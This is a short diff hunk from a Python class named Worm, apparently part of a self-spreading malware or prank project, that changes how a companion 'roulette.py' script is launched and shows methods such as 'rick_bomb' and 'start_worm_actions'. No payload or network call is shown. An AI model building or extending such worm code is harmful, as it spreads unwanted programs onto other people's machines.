@@ -200,8 +200,8 @@ class Worm:
             self.rick_bomb()
     
     def run_roulette(self):   
-        #os.startfile(f"{self.own_path}\\..\\roulette.py")    
-        subprocess.Popen([f"{self.own_path}\\..\\roulette.py", sys.argv[0]], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+        os.startfile(f"{self.own_path}\\..\\roulette.py")    
+        #subprocess.Popen([f"{self.own_path}\\..\\roulette.py", sys.argv[0]], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
     
     def start_worm_actions(self):
         print(self.target_dir_list)
